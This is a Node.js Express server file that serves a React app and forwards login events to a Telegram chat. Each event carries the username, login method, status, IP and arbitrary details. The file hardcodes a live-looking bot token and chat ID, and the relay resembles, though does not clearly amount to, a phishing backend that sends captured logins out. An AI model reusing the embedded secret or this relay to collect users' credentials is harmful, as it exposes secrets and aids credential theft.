
const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const port = process.env.PORT || 3001;

// Telegram Bot API bilgileri
const BOT_TOKEN = '8629686439:AAGeeFkp232JK-8NWW4tVZitDPScGfGMsqE';
const CHAT_ID = '6760722119';

app.use(express.json());
app.use(express.static(path.join(__dirname, 'build')));

// API endpoint for sending notifications
app.post('/api/notify', async (req, res) => {
  const { event, user, details } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  let message = `🔔 *Yeni Bildirim: ${event.toUpperCase()}* 🔔

`;
  message += `👤 *Kullanıcı:* ${user.username}
`;
  message += `📲 *Giriş Yöntemi:* ${user.method}
`;
  message += `💡 *Durum:* ${user.status}
`;
  message += `🌐 *IP Adresi:* ${ip}

`;

  if (details) {
    message += `📋 *Detaylar:*
`;
    for (const [key, value] of Object.entries(details)) {
      message += `  - *${key}:* ${value}
`;
    }
  }

  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const data = await response.json();
    if (data.ok) {
      res.status(200).send({ status: 'success', message: 'Notification sent' });
    } else {
      res.status(500).send({ status: 'error', message: 'Failed to send notification', details: data });
    }
  } catch (error) {
    res.status(500).send({ status: 'error', message: 'Internal server error' });
  }
});

// Diğer tüm istekleri React uygulamasına yönlendir
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
